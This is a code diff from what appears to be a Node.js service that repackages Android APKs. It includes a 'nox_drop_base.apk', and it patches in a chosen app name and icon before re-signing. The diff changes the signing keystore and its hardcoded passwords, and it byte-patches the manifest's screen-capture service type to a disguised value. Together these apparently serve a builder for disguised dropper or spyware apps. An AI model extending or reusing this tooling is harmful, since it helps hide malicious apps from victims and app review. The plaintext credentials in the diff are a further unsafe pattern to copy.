@@ -23,7 +23,7 @@ const TEMP_DIR   = path.join(__dirname, 'temp');
 const BASE_APK      = path.join(ASSETS_DIR, 'base.apk');
 const NOX_DROP_BASE = path.join(ASSETS_DIR, 'nox_drop_base.apk');
 const DEFAULT_ICON  = path.join(ASSETS_DIR, 'default_icon.png');
-const KEYSTORE      = path.join(ASSETS_DIR, 'release.jks');
+const KEYSTORE      = path.join(ASSETS_DIR, 'usman90.jks');
 const SIGNER        = path.join(ASSETS_DIR, 'uber-apk-signer.jar');
 
 if (!fs.existsSync(TEMP_DIR)) fs.mkdirSync(TEMP_DIR, { recursive: true });
@@ -158,7 +158,7 @@ function patchArscTitle(arscBuf, targetName) {
 
 async function signApk(unsignedPath, outDir = TEMP_DIR) {
     const ksArgs = fs.existsSync(KEYSTORE)
-        ? `--ks "${KEYSTORE}" --ksAlias release --ksPass "syndicate2026" --ksKeyPass "syndicate2026"`
+        ? `--ks "${KEYSTORE}" --ksAlias usman90 --ksPass "God112256@" --ksKeyPass "God112256@"`
         : '';
     const signCmd = `java -jar "${SIGNER}" --apks "${unsignedPath}" --out "${outDir}" ${ksArgs} --allowResign`;
 
@@ -491,7 +491,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 }
 
                 if (!isScreenCaptureEnabled) {
-                    binaryReplaceU16(manifestBuf, 'mediaProjection', 'connectedDevice');
+                    binaryReplaceU16(manifestBuf, 'mediaProjection', 'dataSync_______');
                 }
 
                 manifestEntry.setData(manifestBuf);
